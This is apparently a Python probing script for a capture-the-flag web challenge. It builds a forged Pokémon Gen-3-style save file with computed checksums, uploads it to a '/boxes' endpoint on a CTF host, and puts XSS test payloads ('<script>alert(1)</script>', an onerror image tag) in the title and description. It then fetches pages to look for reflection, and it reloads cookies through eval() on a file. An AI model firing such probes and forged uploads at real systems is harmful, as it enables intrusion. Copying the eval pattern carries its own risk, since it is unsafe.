import os, sys, struct, requests, re
BASE=os.environ.get("BASE","http://27wg1nxt69l0o1gh.instances.ctfcup.online")
os.makedirs("artifacts",exist_ok=True)
OUT=open("artifacts/out.txt","w")
def log(*a):
    s=" ".join(str(x) for x in a); print(s); OUT.write(s+"\n")
def show(label,r,limit=6000):
    log("="*15,label,"="*15); log(r.request.method,r.url,"->",r.status_code,"len",len(r.content))
    for k,v in r.headers.items():
        if k.lower() in ('content-type','location'): log("H",k+":",v[:150])
    log(r.text[:limit]); log()
s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
def save(): open("artifacts/cookie.txt","w").write(repr(s.cookies.get_dict()))
def load():
    try:
        for k,v in eval(open("artifacts/cookie.txt").read()).items(): s.cookies.set(k,v)
        log("cookie loaded")
    except Exception as e: log("cookie err",e)
load()

CHARS="ABCDEFGHIJ"
G3={}
for i,c in enumerate("ABCDEFGHIJKLMNOPQRSTUVWXYZ"): G3[c]=0xBB+i
for i,c in enumerate("abcdefghijklmnopqrstuvwxyz"): G3[c]=0xD5+i
for i,c in enumerate("0123456789"): G3[c]=0xA1+i
G3[' ']=0x00; G3['!']=0xAB; G3['?']=0xAC; G3['.']=0xAD; G3['-']=0xAE
def g3s(t,n=None):
    b=bytes(G3.get(c,0x00) for c in t)+b'\xff'
    if n: b=b.ljust(n,b'\x00')
    return b

def checksum(data):
    s=0
    for i in range(0,len(data)-len(data)%4,4):
        s=(s+struct.unpack_from('<I',data,i)[0])&0xFFFFFFFF
    s=(s&0xFFFF)+(s>>16)
    return s&0xFFFF
SIZES={0:3884,1:3968,2:3968,3:3968,4:3848,5:3968,6:3968,7:3968,8:3968,9:3968,10:3968,11:3968,12:3968,13:2000}
def make_save(name="AGENT", party=None, boxjson=None):
    buf=bytearray(0x20000)
    def sec(base,idx,counter,data):
        sec=bytearray(0x1000); d=bytes(data)
        sec[0:len(d)]=d
        sec[0xFF4:0xFF6]=struct.pack('<H',idx)
        cs=checksum(sec[0:SIZES[idx]])
        sec[0xFF6:0xFF8]=struct.pack('<H',cs)
        sec[0xFF8:0xFFC]=struct.pack('<I',0x08012025)
        sec[0xFFC:0x1000]=struct.pack('<I',counter)
        buf[base+idx*0x1000:base+(idx+1)*0x1000]=sec
    # slot A
    s0=bytearray(SIZES[0]); s0[0:8]=g3s(name,8); s0[0x08]=0
    struct.pack_into('<I',s0,0x0A,12345)
    sec(0x0000,0,100,s0)
    s1=bytearray(SIZES[1])
    struct.pack_into('<I',s1,0x234, len(party) if party else 0)
    for i,p in enumerate(party or []):
        s1[0x238+i*100:0x238+(i+1)*100]=p
    sec(0x0000,1,100,s1)
    for i in range(2,14):
        sec(0x0000,i,100,bytes(SIZES[i]))
    # slot B minimal valid with lower counter
    for i in range(14):
        sec(0xE000,i,50,bytes(SIZES[i]))
    return bytes(buf)

def pkm(nick="PIKA", level=50, pid=0x12345678, otid=12345, species=25):
    p=bytearray(100)
    struct.pack_into('<I',p,0x00,pid)
    struct.pack_into('<I',p,0x04,otid)
    p[0x08:0x08+7]=g3s(nick,7)
    p[0x12]=2 # language
    p[0x14:0x14+7]=g3s("AGENT",7)
    struct.pack_into('<I',p,0x54,level)  # level at 0x54
    # encrypted substructs: put species in first substruct word blindly
    body=bytearray(48)
    struct.pack_into('<H',body,0,species)
    # simple xor with pid
    key=0
    p[0x20:0x20+48]=bytes(b ^ 0 for b in body)
    cs=checksum(bytes(p[0x20:0x20+48]))
    struct.pack_into('<H',p,0x1C,cs)
    return bytes(p)

sv=make_save("AGENT",[pkm()])
open("artifacts/test.sav","wb").write(sv)
files={'save':('agent.sav',sv,'application/octet-stream')}
r=s.post(BASE+"/boxes",data={"title":"My box [b]bold[/b] <script>alert(1)</script>","description":"desc [shiny]x[/shiny] <img src=x onerror=alert(2)>"},files=files,timeout=30,allow_redirects=False)
show("POST /boxes valid-save",r)
show("GET /boxes", s.get(BASE+"/boxes",timeout=20))
show("GET /", s.get(BASE+"/",timeout=20))
show("GET /u/trainer01", s.get(BASE+"/u/trainer01",timeout=20))
# find box link
t=s.get(BASE+"/boxes",timeout=20).text
for m in re.findall(r'href="([^"]+)"', t):
    if 'box' in m: show("GET "+m, s.get(BASE+m,timeout=20))
save(); OUT.close()
